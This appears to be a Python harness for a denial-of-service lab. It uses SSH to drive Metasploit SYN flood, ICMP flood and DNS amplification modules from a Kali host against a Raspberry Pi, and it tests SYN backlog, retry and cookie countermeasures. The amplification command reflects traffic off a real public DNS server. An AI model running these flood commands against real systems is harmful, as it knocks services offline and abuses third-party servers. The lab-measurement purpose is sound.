__all__ = ["run_cmd", "run_cmd_as_root", "put_file", "get_file", "kill_process_with_pid", "start_pi_server",
           "kill_pi_server", "start_pi_mem_loop", "kill_pi_mem_loop", "start_synflood", "start_icmpflood",
           "start_dns_amp", "kill_synflood", "kill_icmpflood", "kill_dns_amp", "start_packet_capture",
           "kill_packet_capture", "change_backlog", "change_timer", "change_cookies",  "reset_all_measures"]

import os
import time

import paramiko
import configparser


# read config file to get IP addresses, usernames and passwords
config = configparser.ConfigParser()
config.read('DOSHelperConfig.ini')


HOME = "/home"

KALI_IP = config["kali"]["IP"]
KALI_USERNAME = config["kali"]["USERNAME"]
KALI_PASSWORD = config["kali"]["PASSWORD"]
KALI_ROOT_PASSWORD = config["kali"]["ROOT_PASSWORD"]

PI_IP = config["pi"]["IP"]
PI_USERNAME = config["pi"]["USERNAME"]
PI_PASSWORD = config["pi"]["PASSWORD"]
PI_ROOT_PASSWORD = config["pi"]["ROOT_PASSWORD"]

SERVER_PORT = "10000"

MEM_FREE_FILE = "mem_free.txt"
CAPTURE_FILE = "capture.txt"
SERVER_FILE = "FancyTCPServer.py"
DNS_SERVER = "198.41.0.4"
SSH_TRIES = 2

BACKLOG = "/proc/sys/net/ipv4/tcp_max_syn_backlog"
TIMER = "/proc/sys/net/ipv4/tcp_synack_retries"
COOKIES = "/proc/sys/net/ipv4/tcp_syncookies"

PI_MEM_CMD = "rm -f mem_free.txt; while true; do echo $(echo -n $(python -c 'import time; print time.time()'); " \
             "echo -n ','; free | grep -i mem | awk '{print $3;}') >> mem_free.txt; sleep 0.1; done & echo $!"
SYNFLOOD_CMD = f"msfconsole -x 'use auxiliary/dos/tcp/synflood; set RHOSTS {PI_IP}; set RPORT {SERVER_PORT}; run'" \
               f" >> kali_logs 2>> kali_logs"
ICMPFLOOD_CMD = f"msfconsole -x 'use auxiliary/dos/icmp_flooder; set RHOSTS {PI_IP}; run' >> kali_logs 2>> kali_logs"
DNSAMP_CMD = f"msfconsole -x 'use auxiliary/dos/dns_amp; set RHOSTS {DNS_SERVER}; set SHOST {PI_IP}; " \
             f"set SPORT {SERVER_PORT}; run' >> kali_logs 2>> kali_logs "
CAPTURE_CMD = f"tshark -f tcp > {CAPTURE_FILE}"
SERVER_CMD = f"python3 {SERVER_FILE} > pi_logs 2>> pi_logs"
KILL_SERVER_CMD = f"pkill -f {SERVER_FILE}"
KILL_SYNFLOOD_CMD = "pkill -f synflood"
KILL_ICMPFLOOD_CMD = "pkill -f icmp_flooder"
KILL_DNS_AMP_CMD = "pkill -f dns_amp"
KILL_CAPTURE_CMD = "killall tshark"


def _ssh_to(device):
    # function to ssh connect to a device with paramiko and return the connection. Device can be "pi" or "kali"
    if device not in ["pi", "kali"]:
        raise NotImplementedError("Only support pi and kali")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    tries = 0
    err_msg = ""

    while tries < SSH_TRIES:
        try:
            if device == "pi":
                ssh.connect(PI_IP, username=PI_USERNAME, password=PI_PASSWORD)
            else:
                ssh.connect(KALI_IP, username=KALI_USERNAME, password=KALI_PASSWORD)
            break
        except paramiko.ssh_exception.SSHException as e:
            err_msg = e
            tries += 1

    if tries == 2:
        raise paramiko.ssh_exception.SSHException("Had problems with SSH connection", err_msg)

    return ssh


def run_cmd(device, cmd, output=False):
    # function to run command on device and get the output is function has output
    ssh = _ssh_to(device)
    _, ssh_stdout, _ = ssh.exec_command(cmd)
    time.sleep(0.5)  # allow cmd execute
    ssh.close()
    if output:
        return ssh_stdout.read().decode().strip()


def run_cmd_as_root(device, cmd):
    # function to run commands on device as root
    ssh = _ssh_to(device)

    ssh_stdin, _, _ = ssh.exec_command('su')
    time.sleep(0.1)  # some environment maybe need this.

    if device == "pi":
        ssh_stdin.write(f"{PI_ROOT_PASSWORD}\n")
    else:
        ssh_stdin.write(f"{KALI_ROOT_PASSWORD}\n")

    ssh_stdin.write(f"{cmd}\n")
    time.sleep(0.5)  # allow cmd execute
    ssh.close()


def put_file(device, filename):
    # put a file from this current folder to the home folder on device
    ssh = _ssh_to(device)
    sftp = ssh.open_sftp()

    if device == "pi":
        sftp.put(os.path.join(os.getcwd(), filename), os.path.join(HOME, PI_USERNAME, filename))
    else:
        sftp.put(os.path.join(os.getcwd(), filename), os.path.join(HOME, KALI_USERNAME, filename))

    sftp.close()
    ssh.close()


def get_file(device, filename):
    # get a file from the home folder on device to this current folder
    ssh = _ssh_to(device)
    sftp = ssh.open_sftp()

    if device == "pi":
        sftp.get(os.path.join(HOME, PI_USERNAME, filename), os.path.join(os.getcwd(), filename))
    else:
        sftp.get(os.path.join(HOME, KALI_USERNAME, filename), os.path.join(os.getcwd(), filename))

    sftp.close()
    ssh.close()


def kill_process_with_pid(device, pid):
    # stops a process on a device if you have the process id
    run_cmd(device, f"kill {pid}")


def start_pi_server():
    # moves SERVER_FILE to the Raspberry Pi and runs it
    put_file("pi", SERVER_FILE)
    run_cmd("pi", SERVER_CMD)


def kill_pi_server():
    # kills running Python Server on raspberry pi
    run_cmd("pi", KILL_SERVER_CMD)
    time.sleep(60)  # wait for Pi server to die


def start_pi_mem_loop():
    # start a loop on pi to monitor memory usage
    return run_cmd("pi", PI_MEM_CMD, True)


def kill_pi_mem_loop(pid):
    # kills loop on pi that was monitoring mem usage and get the output file
    kill_process_with_pid("pi", pid)
    get_file("pi", MEM_FREE_FILE)


def start_synflood():
    # use Metasploit on Kali to launch SYN flood attack against Pi
    run_cmd_as_root("kali", SYNFLOOD_CMD)


def start_icmpflood():
    # use Metasploit on Kali to launch ICMP flood attack against Pi
    run_cmd_as_root("kali", ICMPFLOOD_CMD)


def start_dns_amp():
    # use Metasploit on Kali to launch DNS amplification attack against Pi
    run_cmd_as_root("kali", DNSAMP_CMD)


def kill_synflood():
    # stop SYN flood attack running through Metasploit on Kali Linux
    run_cmd_as_root("kali", KILL_SYNFLOOD_CMD)


def kill_icmpflood():
    # stop ICMP flood attack running through Metasploit on Kali Linux
    run_cmd_as_root("kali", KILL_ICMPFLOOD_CMD)


def kill_dns_amp():
    # stop DNS amplification attack running through Metasploit on Kali Linux
    run_cmd_as_root("kali", KILL_DNS_AMP_CMD)


def start_packet_capture(device, cmd=CAPTURE_CMD):
    # start a tshark packet capture on the device with a tshark command
    run_cmd_as_root(device, cmd)


def kill_packet_capture(device):
    # kill tshark processes running on device
    run_cmd_as_root(device, KILL_CAPTURE_CMD)
    get_file(device, CAPTURE_FILE)


def change_backlog(val=128):
    # change the SYN backlog value on Pi as a DOS countermeasure
    run_cmd_as_root("pi", f"echo {val} > {BACKLOG}")


def change_timer(val=5):
    # change the SYNACK retries value on Pi as a DOS countermeasure
    run_cmd_as_root("pi", f"echo {val} > {TIMER}")


def change_cookies(val=1):
    # change the SYN cookies value on Pi as a DOS countermeasure
    run_cmd_as_root("pi", f"echo {val} > {COOKIES}")


def reset_all_measures():
    # reset all DOS countermeasures to their default values
    change_backlog()
    change_timer()
    change_cookies()


# noinspection PyBroadException
def setup():
    # remove old log files on devices (pi and kali) if possible
    try:
        run_cmd("pi", "rm pi_logs")
    except Exception:
        pass
    try:
        run_cmd("kali", "rm kali_logs")
    except Exception:
        pass


setup()
